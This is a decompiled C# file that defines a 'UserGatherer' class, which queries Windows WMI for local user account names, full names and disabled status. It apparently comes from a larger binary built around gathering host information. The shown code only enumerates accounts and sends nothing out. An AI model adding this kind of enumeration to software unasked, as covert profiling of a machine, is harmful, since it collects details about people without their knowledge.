using System;
using System.Collections.Generic;
using NoiseMe.Drags.App.Models.WMI.Objects;

namespace NoiseMe.Drags.App.Data.WMI
{
	// Token: 0x02000175 RID: 373
	public static class UserGatherer
	{
		// Token: 0x06000C13 RID: 3091 RVA: 0x00024218 File Offset: 0x00022418
		public static ICollection<UserAccount> GetUsers()
		{
			List<UserAccount> list = new List<UserAccount>();
			string[] properties = new string[]
			{
				"Name",
				"FullName",
				"Disabled"
			};
			WmiInstanceClassCollection wmiInstanceClassCollection = WmiInstance.Query("Win32_UserAccount", properties, null);
			if (wmiInstanceClassCollection == null)
			{
				return list;
			}
			foreach (WmiInstanceClass wmiInstanceClass in wmiInstanceClassCollection)
			{
				UserAccount item = new UserAccount((string)wmiInstanceClass["Name"].Value, (string)wmiInstanceClass["FullName"].Value, (bool?)wmiInstanceClass["Disabled"].Value);
				list.Add(item);
			}
			return list;
		}
	}
}
